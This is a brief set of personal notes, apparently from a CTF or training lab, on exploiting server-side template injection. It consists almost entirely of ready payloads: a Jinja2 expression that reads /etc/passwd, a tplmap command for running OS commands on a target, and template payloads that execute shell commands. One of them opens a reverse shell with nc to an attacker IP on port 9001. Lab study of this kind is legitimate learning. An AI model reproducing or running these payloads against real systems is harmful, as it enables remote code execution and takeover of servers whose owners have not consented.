# Obscure Vulnerabilities

```
SSTI
```
Payload all the things resource: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

Manual exploitation example:

{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}

Automated exploitation

Tool to use could be Tplmap https://github.com/epinna/tplmap

Example:

./tplmap.py -u http://10.10.10.10:5000 -d 'noot' --os-cmd "cat /etc/passwd"


```
Section 1 SSTI Challenge
```

{{2+2}}

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.64.191 9001 >/tmp/f').read() }}

